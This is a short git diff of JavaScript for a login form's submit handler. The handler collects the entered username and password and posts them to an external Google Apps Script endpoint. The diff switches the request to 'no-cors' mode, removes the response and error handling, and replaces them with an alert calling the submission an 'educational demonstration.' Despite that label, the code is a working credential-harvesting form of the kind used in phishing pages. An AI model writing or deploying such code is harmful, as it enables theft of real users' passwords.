@@ -8,21 +8,14 @@ form.addEventListener("submit", function (e) {
 
     fetch("https://script.google.com/macros/s/AKfycbxfAPByykld75--6V5MH-mG3R-OIwQQX2KLxO6oiO_0eTMZtC9djBPPwHY6F-sbynTz/exec", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        mode: "no-cors",
         body: JSON.stringify({
             username: username,
             password: password
         })
-    })
-    .then(response => response.text())
-    .then(data => {
-        alert("Educational Demonstration: Test data submitted successfully.");
-        form.reset();
-    })
-    .catch(error => {
-        alert("Error submitting data.");
-        console.error(error);
     });
+
+    alert("Educational demonstration submitted.");
+
+    form.reset();
 });
